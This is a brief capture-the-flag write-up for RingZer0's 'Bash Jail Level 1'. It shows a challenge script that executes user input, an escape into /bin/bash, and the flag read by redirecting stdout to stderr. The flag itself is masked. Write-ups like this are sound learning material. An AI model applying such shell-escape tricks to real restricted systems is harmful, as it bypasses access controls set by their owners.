# Bash Jail 1

RingZer0 Team Online CTF

BASH Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

```bash
Challenge bash code:
-----------------------------

while :
do
    echo "Your input:"
    read input
    output=`$input`
done

-----------------------------
Your input:
```


Okey let's try `/etc/passwd`

`/home/level1/prompt.sh: line 24: /etc/passwd: Permission denied`

Or try `/bin/bash`

```bash
/bin/bash
level1@lxc17-bash-jail:~$ who
who     whoami
level1@lxc17-bash-jail:~$ who
who     whoami
level1@lxc17-bash-jail:~$ whoami
level1@lxc17-bash-jail:~$ cat /home/level1/flag.txt
level1@lxc17-bash-jail:~$ ls
```

But we can't read stdout, let's redirect stdout to stderr

```bash
level1@lxc17-bash-jail:~$ cat /home/level1/flag.txt 1>&2
FLAG-*******
```
